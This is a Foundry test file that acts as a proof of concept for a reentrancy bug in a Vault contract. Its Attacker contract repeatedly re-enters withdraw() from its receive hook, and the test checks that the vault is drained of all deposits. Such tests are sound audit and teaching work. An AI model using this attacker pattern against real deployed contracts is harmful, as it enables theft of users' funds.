// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// Re-enters Vault.withdraw() from its receive hook until the vault is empty.
contract Attacker {
    Vault public immutable vault;

    constructor(Vault target) {
        vault = target;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

contract PoCTest is Test {
    function test_reentrancyDrainsVault() public {
        Vault vault = new Vault();
        address victim = makeAddr("victim");
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();

        Attacker attacker = new Attacker(vault);
        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 0, "vault should be drained");
        assertEq(address(attacker).balance, 6 ether, "attacker should hold every deposit");
    }
}
